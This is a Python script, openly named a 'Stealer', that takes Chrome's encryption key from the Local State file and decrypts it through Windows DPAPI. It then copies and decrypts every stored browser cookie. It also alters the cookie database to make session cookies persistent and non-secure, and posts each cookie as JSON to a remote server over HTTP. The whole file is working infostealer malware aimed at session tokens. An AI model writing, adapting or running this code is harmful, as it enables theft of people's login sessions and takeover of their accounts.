import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt  # pip install pypiwin32
from Crypto.Cipher import AES  # pip install pycryptodome
from pydantic import BaseModel
from typing import List
import requests


class Cookie(BaseModel):
    host: str
    name: str
    value: str
    creation_utc: str
    last_access_utc: str
    expires_utc: str


class AESDecrypter:
    def __init__(self, key):
        self._key = key

    def decrypt(self, data) -> str:
        try:
            # get the initialization vector
            iv = data[3:15]
            data = data[15:]
            # generate cipher
            cipher = AES.new(self._key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                return ""


class Stealer:
    def __init__(self, user_profile):
        self._user_profile = user_profile
        encryption_key = self.__get_encryption_key()
        self._decrypter = AESDecrypter(encryption_key)

    def __get_chrome_datetime(self, chromedate) -> str:
        """Return a `datetime.datetime` object from a chrome format datetime
        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
        if chromedate != 86400000000 and chromedate:
            try:
                datetime_fixed = datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
                return datetime_fixed.strftime("%Y-%m-%d %H:%M:%S.%f")
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""

    def __get_encryption_key(self):
        local_state_path = os.path.join(self._user_profile,
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove 'DPAPI' str
        key = key[5:]
        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def __get_cookies_db(self):
        # local sqlite Chrome cookie database path
        db_path = os.path.join(self._user_profile, "AppData", "Local",
                               "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
        # copy the file to current directory
        # as the database will be locked if chrome is currently open
        filename = "Cookies.db"
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        db.text_factory = lambda b: b.decode(errors="ignore")
        return db

    def get_cookies(self) -> List[Cookie]:
        db = self.__get_cookies_db()

        cursor = db.cursor()
        # get the cookies from `cookies` table
        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
        FROM cookies""")

        cookies = []

        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = self._decrypter.decrypt(encrypted_value)
            else:
                decrypted_value = value

            cookies.append(Cookie(
                host=host_key,
                name=name,
                value=decrypted_value,
                creation_utc=self.__get_chrome_datetime(creation_utc),
                last_access_utc=self.__get_chrome_datetime(last_access_utc),
                expires_utc=self.__get_chrome_datetime(expires_utc)
            ))
            # update the cookies table with the decrypted value
            # and make session cookie persistent
            cursor.execute("""
            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
            WHERE host_key = ?
            AND name = ?""", (decrypted_value, host_key, name))
        db.commit()
        db.close()

        return cookies


class CookieSender:
    def __init__(self, host: str, port: int):
        self._host = host
        self._port = port

    def send_cookies_to_server(self, cookies: List[Cookie]):
        for cookie in cookies:
            requests.post(f"{self._host}:{self._port}/cookies", json=cookie.dict())


def print_cookies(cookies: List[Cookie]):
    for cookie in cookies:
        print(f"""
                Host: {cookie.host}
                Cookie name: {cookie.name}
                Cookie value (decrypted): {cookie.value}
                Creation datetime (UTC): {cookie.creation_utc}
                Last access datetime (UTC): {cookie.last_access_utc}
                Expires datetime (UTC): {cookie.expires_utc}
                ===============================================================""")


def main():
    cookies = Stealer(os.environ["USERPROFILE"]).get_cookies()
    print_cookies(cookies)
    CookieSender("http://127.0.0.1", 8000).send_cookies_to_server(cookies)


if __name__ == "__main__":
    main()
